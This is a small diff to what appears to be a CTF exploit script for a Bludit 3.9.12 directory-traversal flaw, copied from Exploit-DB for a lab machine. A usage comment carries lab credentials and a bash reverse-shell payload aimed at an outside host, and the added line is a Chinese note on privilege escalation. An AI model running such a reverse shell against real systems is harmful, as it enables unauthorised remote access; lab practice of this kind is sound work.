@@ -1,5 +1,6 @@
 # copy from https://www.exploit-db.com/exploits/48568 just for quick access and no need to change the code
 # python3 blunder.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c "echo 'bash -i >&/dev/tcp/10.10.10.10/443 0>&1' | /bin/bash"
+# 关键在.py文件应用提权
 
 
 # Exploit Title: Bludit 3.9.12 - Directory Traversal
